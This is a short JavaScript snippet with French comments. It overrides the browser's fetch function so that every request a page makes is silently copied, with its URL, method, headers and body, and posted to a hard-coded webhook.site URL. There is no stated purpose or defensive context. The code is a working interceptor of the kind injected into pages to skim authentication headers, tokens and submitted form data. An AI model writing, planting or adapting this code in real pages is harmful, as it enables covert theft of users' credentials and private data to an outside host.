// On sauvegarde l'original de fetch
const originalFetch = window.fetch;

window.fetch = async function(...args) {
    const response = await originalFetch.apply(this, args);

    // Copie la requête que tu viens de faire
    const [resource, config] = args;

    const logData = {
        resource: resource,
        method: config?.method || 'GET',
        headers: config?.headers || {},
        body: config?.body || null,
        timestamp: new Date().toISOString()
    };

    // On l'envoie vers le webhook
    fetch("https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(logData)
    });

    return response;
};
